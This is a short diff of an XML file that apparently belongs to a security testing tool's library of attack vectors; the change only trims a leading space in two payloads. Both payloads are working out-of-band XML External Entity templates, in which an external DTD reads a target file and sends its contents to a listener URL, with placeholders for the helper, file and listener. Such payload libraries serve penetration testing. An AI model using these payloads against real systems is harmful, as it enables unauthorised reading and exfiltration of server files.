@@ -13,7 +13,7 @@
 <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "§tf_helperURL§">
 <data>&send;</data>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % file SYSTEM "§tf_targetFILE§">
+<helperMessage><![CDATA[<!ENTITY % file SYSTEM "§tf_targetFILE§">
 <!ENTITY % all "<!ENTITY send SYSTEM '§tf_listenURL§?%file;'>">
 %all;]]></helperMessage>
 </attackvector>
@@ -21,7 +21,7 @@
 <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data PUBLIC "p" "§tf_helperURL§">
 <data>&send;</data>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % file PUBLIC "p2" "§tf_targetFILE§">
+<helperMessage><![CDATA[<!ENTITY % file PUBLIC "p2" "§tf_targetFILE§">
 <!ENTITY % all "<!ENTITY send PUBLIC "p3" '§tf_listenURL§?%file;'>">
 %all;]]></helperMessage>
 </attackvector>
